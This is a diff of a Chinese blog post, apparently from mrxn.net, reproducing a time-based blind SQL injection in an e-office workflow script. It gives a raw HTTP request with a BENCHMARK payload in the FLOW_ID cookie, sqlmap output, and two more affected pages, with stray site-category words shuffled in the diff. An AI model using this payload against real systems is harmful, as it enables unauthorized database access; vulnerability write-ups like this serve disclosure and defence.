@@ -36,14 +36,6 @@ $res = exequery( $connection, $sql );
 
 # 漏洞复现
 
-深入探索
-
-参考信息
-
-黑客
-
-blog
-
 ```
 GET /general/workflow/runimgflow.php HTTP/1.1
 Host: eoffice.mrxn.net:8082
@@ -54,7 +46,15 @@ Cookie: FLOW_ID=1 AND 7348=BENCHMARK(5000000,MD5(0x51747266))
 
 成功在延时 5 秒
 
-商务软件和生产力软件
+脚本语言
+
+深入探索
+
+data
+
+字典与百科全书
+
+blog
 
 [sqlmap](https://mrxn.net/tag/sqlmap) 结果如下
 
@@ -71,13 +71,5 @@ Parameter: #1* ((custom) POST)
     Payload: FLOW_ID=1 AND 7348=BENCHMARK(5000000,MD5(0x51747266))
 ---
 ```
-
-深入探索
-
-计算机安全
-
-编程
-
-数据管理
 
 imgflow.php、flowimg.php 存在同样的[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：SQL注入")漏洞
